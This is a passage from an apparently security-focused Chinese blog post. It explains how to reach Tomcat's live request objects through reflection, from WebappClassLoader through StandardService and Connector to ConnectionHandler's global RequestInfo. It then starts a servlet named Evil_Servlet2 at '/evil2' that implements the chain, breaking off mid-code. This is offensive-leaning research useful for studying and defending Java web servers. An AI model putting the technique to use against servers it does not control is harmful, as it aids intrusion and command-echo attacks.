response</code> 参数来自它的父类传参–<code>AbstractProcessor</code>，既然是他的父类传递的值，那么父类<code>AbstractProcessor</code>肯定被调用了。但是我们在调用栈中并没有找到<code>AbstractProcessor</code>的具体调用，观察上一级调用栈，是 AbstractProcessorLight，他其实是AbstractProcessor和Http11Processor 共同父类，只不过 Http11Processor 是继承自AbstractProcessor 才继承于 AbstractProcessorLight<br>关键是获取 AbstractProcessor，但是由于前面其实没有直接对于AbstractProcessor 的引用，这里我们获取到 Http11Processor 是一样的效果，也能获取到Request 和 Response<br>那么如何获取到 Http11Processor 呢？这里我们可以在任意 servlet 或者 controller 处打个断点（两者处的调用栈大差不差）然后观察一下（看上面的调用栈就行）在<code>AbstractProcessorLight</code>调用到 Http11<br>Processor 之前，由<code>ConnectionHandler</code>调用 process 方法中有如下逻辑：<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721749659786-73d4ca42-b921-4367-a6cf-cb249e502afd.png#averageHue=%23282c32&clientId=u9d1c3e82-4b69-4&from=paste&height=436&id=u9228976d&originHeight=719&originWidth=1664&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=364174&status=done&style=none&taskId=u5b424719-6a80-49fa-b0f6-7b99fe2fdc8&title=&width=1008.4847901959974\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>两次判断 processor 是否为空，第一次是在判断之后执行的逻辑是判断我们否加载过 processor，如果有就直接给他加载出来不用后续的加载了。第二次判断是如果我们本次请求中没有加载过 processor 就从 AbstractProtocol 中调用<code>createProcessor()</code>方法来创建 Http11Processor<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721783821563-9e55380e-1899-4d44-a5b3-b247f2bbb1f1.png#averageHue=%232d2f33&clientId=u02afbd6d-c9af-4&from=paste&height=238&id=u5ac820d0&originHeight=446&originWidth=1276&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=242613&status=done&style=none&taskId=uf15295a0-6b1f-463d-ae69-1c22c5b7e3b&title=&width=680.5333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这里知道 Http11Processor 创建的过程还不够，我们还无法通过自己的代码执行去获取到 Http11Processor，只能再往下看<br>然后调用 register 方法，主要是从中获取一些请求信息（包括我们的 request），并封装存储起来<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721784132967-a92666c6-8310-48b4-9be0-abc31d004f80.png#averageHue=%2328292d&clientId=u02afbd6d-c9af-4&from=paste&height=418&id=ue37bcc51&originHeight=783&originWidth=1568&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=408234&status=done&style=none&taskId=u3fbf7d2d-d3e5-458a-b10a-689edba7a68&title=&width=836.2666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>大致逻辑分为两个部分：</p>\n<ul>\n<li>获取 Processor 中封装的 request 信息，存储为 RequestInfo</li>\n<li>然后将当此的 RequestInfo set 进 global 属性，这里的 global 属性实际上就是 RequestGroupInfo，用来存储这些获取到的RequestInfo</li>\n</ul>\n<p>最终产生的效果如下：<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721790807087-7e213ed3-add1-4678-881f-0d5eff454a99.png#averageHue=%232d2f34&clientId=u0dc855d2-173f-4&from=paste&height=460&id=u142d1bb6&originHeight=863&originWidth=1961&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=554118&status=done&style=none&taskId=u90e1a600-4a35-463b-9d0b-27696271661&title=&width=1045.8666666666666\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>实际上到这我们又找到了一份新的用来存储 req 的地方，就是 ConnectionHandler 的 global 属性，所以可以转变一下思路，获取到这个 global 属性，进而获取到 request<br>又由于ConnectionHandler是 AbstractProtocol 的子类，我们可以先确定一手能否通过 AbstractProtocol 获取到 ConnectionHandler<br>跟进到AbstractProtocol 的构造方法，发现 ConnectionHandler 的构造实例化之后，然后调用 setHandler 方法将其 set 存入<code>this.handler</code>属性值，所以必然有 getHandler 方法获取到 handler<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721791728937-d3e51db9-0895-4020-9134-b5b2efff18c9.png#averageHue=%232c2f36&clientId=u0dc855d2-173f-4&from=paste&height=238&id=uf41264ab&originHeight=446&originWidth=2112&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=295503&status=done&style=none&taskId=u1578d952-52a7-45cc-9fcf-74aee825626&title=&width=1126.4\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721792205435-c48216d4-f7ae-4da1-aaa5-e3d2b0afd12b.png#averageHue=%23292a2c&clientId=u0dc855d2-173f-4&from=paste&height=176&id=u3a1aee9e&originHeight=330&originWidth=881&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=101197&status=done&style=none&taskId=u74f75fc8-d38e-4b89-a047-8cfdff32052&title=&width=469.8666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>所以现在思路后半段就可以通过反射调用<code>AbstractProtocol.getHandler</code>获取到 ConnectionHandler，再反射获取到 global<br>那么现在如何获取到AbstractProtocol？下面的思路就是从<br>首先是 AbstractProtocol 的继承关系<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721806268459-e41fdd3d-e811-4117-9bda-a40091e1d2d4.png#averageHue=%234b564f&clientId=u0dc855d2-173f-4&from=paste&height=163&id=sNXJj&originHeight=306&originWidth=853&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=158552&status=done&style=none&taskId=u9181b060-1767-4fce-94cb-7a2fddffb64&title=&width=454.93333333333334\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>我们如果能够获取到其中一个具体继承的子类，那么就能够获取到 AbstractProtocol。后续的内容其实回顾一下 Tomcat 的架构比较好，但是这里就不讲了，我们直接讲思路。</p>\n<h2 id=\"0x02-思路梳理和总结\"><a href=\"#0x02-思路梳理和总结\" class=\"headerlink\" title=\"0x02 思路梳理和总结\"></a>0x02 思路梳理和总结</h2><p>配合正常调用栈来讲<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721814512258-bdac7df8-f951-46da-b439-8153780faa3a.png#averageHue=%2349544c&clientId=u0dc855d2-173f-4&from=paste&height=502&id=u7a8cab6c&originHeight=941&originWidth=937&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=534912&status=done&style=none&taskId=ub7663315-fd25-44e8-8d4d-d7db3ff1e48&title=&width=499.73333333333335\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>以蓝线为界，CoyoteAdapter 之后的逻辑就是 Tomcat 中 Container 的具体处理那一套了，包括 Valve 和责任链等等<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721911313299-667f4e95-a9ee-4edc-9f94-ec213c309672.png#averageHue=%23c3de72&clientId=u6aa1d2ec-e63e-4&from=paste&height=182&id=uae4ad23b&originHeight=341&originWidth=1051&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=114237&status=done&style=none&taskId=u2a039074-d6f6-4078-b839-c60be490ef7&title=&width=560.5333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>CoyoteAdapter 作为 Tomcat 中 Connector 和 Container 的连接桥梁，本身肯定是会内置 Connector 的具体实现对象的，而 Connector 中的内容我们又可以划分为 ProtocolHandler 和 Adapter 两类，这里的 Adapter 就是CoyoteAdapter了。至于 ProtocolHandler，如果是正常的 Http&#x2F;1.1 的请求，内置的具体实现就是 Http11NioProtocol。<br>所以只要我们发送了一次 Http 请求，就能够通过 Connector 获取到 Http11NioProtocol。现在问题是如何获取到 Connctor？还是按照 Tomcat 的架构来，一个大的 server 具体是由每一个小的 service 去实现的，而一个 service 中又由 connector 和 container 组成。就可以考虑通过 service 去获取 connector。<br>实际上就是获取 StandardService 的 connectors 内置属性,具体的话就是 StandardSercvice 在 addconnector 的时候，最终将所有的 connector 都存进了 connectors 属性中（所以我们还要遍历它）<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721816762222-10b21b90-0996-4921-b04c-31fa198bc310.png#averageHue=%23292b2d&clientId=ua8838585-efcc-4&from=paste&height=232&id=aiBdV&originHeight=435&originWidth=1560&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=264741&status=done&style=none&taskId=ubec400cf-2af8-4827-b70a-2b2497988f0&title=&width=832\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721816837997-38b21e83-2d28-43fc-bc45-53feba2561bb.png#averageHue=%232a2c2e&clientId=ua8838585-efcc-4&from=paste&height=113&id=QTdBY&originHeight=212&originWidth=1001&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=86881&status=done&style=none&taskId=u6f982f33-b1e5-41e2-8dd4-19b39df8bb7&title=&width=533.8666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>到这是最后一个问题，如何获取到 StandardService？这里就涉及到 Tomcat 的一个加载问题。简单来说就是，Tomcat 中有多个 web 容器，但是有可能会出现一个 web 容器中加载了 CC 的 3.1 依赖，但是另一个容器加载了 CC 的 3.2 依赖，全类名相同的情况下就会出现加载问题，所以 Tomcat 中一般内置一种 ClassLoader，用来隔离 web 容器中的类加载工作–<code>WebappClassLoader</code>，<br>而 Thread 类中有 <code>getContextClassLoader()</code>以及 <code>setContextClassLoader()</code>方法 ，主要作用对象就是 WebappClassLoader（有些框架可能就不同，但实际上还是继承自 WebappClassLoaderBase 的其他 loader），所以我们能够通过 Thread.currentThread().getContextClassLoader()方法获取到 WebappClassLoader。<br>再观察一下 WebappClassLoaderBase 中的一些属性，我们能够通过其 getResources 方法获取到 StandardRoot<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1721870965962-58df1443-a9f6-44a2-a2dc-f4b4700c0b26.png#averageHue=%2326282a&clientId=ued30735e-21c6-4&from=paste&height=331&id=ud8c84310&originHeight=621&originWidth=1066&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=245372&status=done&style=none&taskId=u2ac0f684-a470-48a6-8587-f4cd2ea96ba&title=&width=568.5333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>然后就能通过 standardRoot.getContext 获取到 standardContext(standardContext 的某些功能就是通过 standardRoot 实现的)，之后一类反射获取容器高一级管理：standardContext-&gt;ApplicationContext-&gt;standardService</p>\n<p>总结一下整体思路：</p>\n<ol>\n<li>通过 WebappClassLoader-&gt;standardRoot-&gt;standardRoot-&gt;standardContext-&gt;ApplicationContext-&gt;standardService</li>\n<li>通过 service 获取到大 Connector</li>\n<li>再通过大 Connctor 获取到ProtocolHandler，具体的话就是Http11NioProtocol</li>\n<li>又因为Http11NioProtocol 是AbstractProtocol 的子类，所以我们能够通过Http11NioProtocol 去获取到 AbstractProtocol</li>\n<li>最后通过AbstractProtocol 获取到 内置的子类 ConnectionHandler，进而从它的属性值 global 中获取到 requestInfo 中封装的 request</li>\n</ol>\n<h2 id=\"0x03-代码实现\"><a href=\"#0x03-代码实现\" class=\"headerlink\" title=\"0x03 代码实现\"></a>0x03 代码实现</h2><div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">package</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">stoocea</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">example</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Servlets</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">lang</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">reflect</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Method</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Scanner</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Context</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">WebResourceRoot</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">connector</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Connector</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">core</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ApplicationContext</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">core</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">StandardService</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">loader</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">WebappClassLoaderBase</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">coyote</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">*</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">tomcat</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">net</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">AbstractEndpoint</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ServletException</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">annotation</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">WebServlet</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">http</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HttpServlet</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">http</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HttpServletRequest</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">http</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HttpServletResponse</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">IOException</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">InputStream</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">PrintWriter</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">lang</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">reflect</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ArrayList</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Scanner</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">@</span><span style=\"color: #F97583\">WebServlet</span><span style=\"color: #B392F0\">(</span><span style=\"color: #FFAB70\">&quot;/evil2&quot;</span><span style=\"color: #B392F0\">)</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">class</span><span style=\"color: #B392F0\"> Evil_Servlet2 </span><span style=\"color: #F97583\">extends</span><span style=\"color: #B392F0\"> HttpServlet  &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    @</span><span style=\"color: #F97583\">Override</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">protected</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">void</span><span style=\"color: #B392F0\"> doGet(</span><span style=\"color: #F97583\">HttpServletRequest</span><span style=\"color: #B392F0\"> req</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">HttpServletResponse</span><span style=\"color: #B392F0\"> resp) </span><span style=\"color: #F97583\">throws</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">ServletException</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">IOException</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">try</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #6B737C\">//首先获取StandardService</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">WebappClassLoaderBase</span><span style=\"color: #B392F0\"> webappClassLoaderBase </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> (WebappClassLoaderBase) </span><span style=\"color: #79B8FF\">Thread</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">currentThread()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getContextClassLoader();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> webappclassLoaderBaseField</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.catalina.loader.WebappClassLoaderBase&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;resources&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">webappclassLoaderBaseField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">WebResourceRoot</span><span style=\"color: #B392F0\"> resources</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(WebResourceRoot) </span><span style=\"color: #79B8FF\">webappclassLoaderBaseField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(webappClassLoaderBase);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Context</span><span style=\"color: #B392F0\"> Context </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">  </span><span style=\"color: #79B8FF\">resources</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getContext();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> context </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.catalina.core.StandardContext&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;context&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">ApplicationContext</span><span style=\"color: #B392F0\"> applicationContext</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(ApplicationContext) </span><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(Context);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> standardServiceField </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.catalina.core.ApplicationContext&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;service&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">standardServiceField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">StandardService</span><span style=\"color: #B392F0\"> standardService</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(StandardService) </span><span style=\"color: #79B8FF\">standardServiceField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(applicationContext);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #6B737C\">//获取Connctor</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> connectorsField </span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.catalina.core.StandardService&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;connectors&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">connectorsField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Connector</span><span style=\"color: #B392F0\">[] connectors</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(</span><span style=\"color: #F97583\">Connector</span><span style=\"color: #B392F0\">[])</span><span style=\"color: #79B8FF\">connectorsField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(standardService);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #6B737C\">//循环遍历Connectors</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">for</span><span style=\"color: #B392F0\">(</span><span style=\"color: #F97583\">Connector</span><span style=\"color: #B392F0\"> connector</span><span style=\"color: #F97583\">:</span><span style=\"color: #B392F0\"> connectors ) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #6B737C\">//当前去访问请求肯定是Http协议，所以我当前线程生成的connector内置的协议肯定是http</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">connector</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getScheme()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;http&quot;</span><span style=\"color: #B392F0\">))&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #6B737C\">//从Connector中获取到AbstractProtocol对象，实际上现在这个实例是Http11NioProtocol,由于我们获取到的是整个Connectors，也就是说不同的协议存在不同的Connector完成功能的实现，我们这里肯定需要的是Http协议的Connector</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">AbstractProtocol</span><span style=\"color: #B392F0\"> abstractProtocol</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(AbstractProtocol) </span><span style=\"color: #79B8FF\">connector</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getProtocolHandler();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: 